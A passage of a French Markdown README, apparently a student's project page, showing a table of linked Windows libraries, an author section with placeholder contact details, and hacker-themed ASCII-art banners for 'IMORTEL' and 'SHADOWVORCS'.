  │   BIBLIOTHÈQUE       FLAG            RÔLE PRINCIPAL                  │
  │   ─────────────────────────────────────────────────────────────────  │
  │   User32.dll        -luser32        Fenêtres, messages, UI, clavier │
  │   Gdi32.dll         -lgdi32         Rendu graphique GDI              │
  │   Shell32.dll       -lshell32       ShellExecute, fichiers, icônes  │
  │   Winmm.dll         -lwinmm         Son, timers multimédias          │
  │   Ole32.dll         -lole32         COM, interfaces OLE              │
  │   OleAut32.dll      -loleaut32      Automatisation OLE, VARIANT      │
  │   TaskSchd.dll      -ltaskschd      Planificateur Windows (v2)       │
  └──────────────────────────────────────────────────────────────────────┘
```

---

## 09 — AUTEUR

<div align="center">

```
  ╔═══════════════════════════════════════════════════════════════════════╗
  ║                                                                       ║
  ║    ██████████████████████████████████████████████████████████████    ║
  ║    █                                                            █    ║
  ║    █    ██╗███╗   ███╗ ██████╗ ██████╗ ████████╗███████╗██╗   █    ║
  ║    █    ██║████╗ ████║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██║   █    ║
  ║    █    ██║██╔████╔██║██║   ██║██████╔╝   ██║   █████╗  ██║   █    ║
  ║    █    ██║██║╚██╔╝██║██║   ██║██╔══██╗   ██║   ██╔══╝  ██║   █    ║
  ║    █    ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║   ███████╗███████╗  █    ║
  ║    █    ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝  █    ║
  ║    █                                                            █    ║
  ║    █    Marwan Alazzaoui  ──  BTS SIO SISR  ──  Lyon, France   █    ║
  ║    █    Objectif : Bac+3 AIS  //  Septembre 2026               █    ║
  ║    █                                                            █    ║
  ║    █    GitHub  :  github.com/TON_USERNAME                      █    ║
  ║    █    Email   :  ton@email.com                                █    ║
  ║    █                                                            █    ║
  ║    ██████████████████████████████████████████████████████████████    ║
  ║                                                                       ║
  ╚═══════════════════════════════════════════════════════════════════════╝
```

![BTS](https://img.shields.io/badge/BTS_SIO-SISR-red?style=for-the-badge&labelColor=0d0d0d)
![Cyber](https://img.shields.io/badge/CYBERSECURITY-OFFENSIVE_%7C_DEFENSIVE-red?style=for-the-badge&labelColor=0d0d0d)
![Target](https://img.shields.io/badge/TARGET-Bac%2B3_AIS_2026-brightgreen?style=for-the-badge&labelColor=0d0d0d)
![City](https://img.shields.io/badge/LOCATION-LYON_FR-gray?style=for-the-badge&labelColor=0d0d0d)

</div>

---

<div align="center">

```
  ██████████████████████████████████████████████████████████████████████████████
  █                                                                            █
  █              [ SESSION TERMINÉE  //  TRACE EFFACÉE ]                      █
  █              [ DÉCONNEXION  //  IMORTEL  //  LYON, FR ]                   █
  █                                                                            █
  █          "The quieter you become, the more you can hear."                  █
  █                                                                            █
  █                        · IMORTEL · 2025 ·                                 █
  █                                                                            █
  ██████████████████████████████████████████████████████████████████████████████
```

</div>

---

## 10 — SYSTÈME ACTIF

<div align="center">

```
 ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗   ██╗ ██████╗ ██████╗  ██████╗███████╗
 ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║   ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝
 ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║   ██║██║   ██║██████╔╝██║     ███████╗
 ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║╚██╗ ██╔╝██║   ██║██╔══██╗██║     ╚════██║
 ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝ ╚████╔╝ ╚██████╔╝██║  ██║╚██████╗███████║
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝   ╚═══╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
```

```
  ┌──────────────────────────────────────────────────────────────────────────┐
  │                                                                          │
  │   > INITIALISATION DU SYSTÈME.............  [ ████████████████ ] ✓      │
  │   > CHARGEMENT DU NOYAU IMORTEL...........  [ ████████████████ ] ✓      │
  │   > AUTHENTIFICATION : SUCCÈS.............  [ ████████████████ ] ✓      │
  │   > CONNEXION ÉTABLIE — BIENVENUE.........  [ ████████████████ ] ✓      │
  │   > SHADOWVORCS // SIGNAL ACTIF...........  [ ████████████████ ] ✓      │
  │                                                                          │
  │   SYS  > ONLINE   │  AUTH  > GRANTED   │  TRACE  > EFFACÉE              │
  │   LOC  > LYON, FR │  OPR   > IMORTEL   │  SIGNAL > ██████               │
  │                                                                          │
  │                 · S I G N A L   D É T E C T É ·                         │
  │                                                                          │
  └──────────────────────────────────────────────────────────────────────────┘
```

</div>

---

## 11 — IDENTITÉ VISUELLE

<div align="center">

```
 ███████╗██╗  ██╗ █████╗ ██████╗  ██████╗ ██╗    ██╗██╗   ██╗ ██████╗ ██████╗  ██████╗███████╗
 ██╔════╝██║  ██║██╔══██╗██╔══██╗██╔═══██╗██║    ██║██║   ██║██╔═══██╗██╔══██╗██╔════╝██╔════╝
 ███████╗███████║███████║██║  ██║██║   ██║██║ █╗ ██║██║   ██║██║   ██║██████╔╝██║     ███████╗
 ╚════██║██╔══██║██╔══██║██║  ██║██║   ██║██║███╗██║╚██╗ ██╔╝██║   ██║██╔══██╗██║     ╚════██║
 ███████║██║  ██║██║  ██║██████╔╝╚██████╔╝╚███╔███╔╝ ╚████╔╝ ╚██████╔╝██║  ██║╚██████╗███████║
 ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚══╝╚══╝   ╚═══╝   ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
```

```
    ██╗███╗   ███╗ ██████╗ ██████╗ ████████╗███████╗██╗
    ██║████╗ ████║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝██║
    ██║██╔████╔██║██║   ██║██████╔╝   ██║   █████╗  ██║
    ██║██║╚██╔╝██║██║   ██║██╔══██╗   ██║   ██╔══╝  ██║
    ██║██║ ╚═╝ ██║╚██████╔╝██║  ██║   ██║   ███████╗███████╗
    ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚══════╝
```

```
  ┌──────────────────────────────────────────────────────┐
  │   IMORTEL  //  SIGNAL ACTIF  //  LYON, FR            │
  │   > SHADOWVORCS  ██████  ONLINE  ✓                   │
  └──────────────────────────────────────────────────────┘
```

[⬇ Télécharger imortel.png](./imortel.png)

</div>
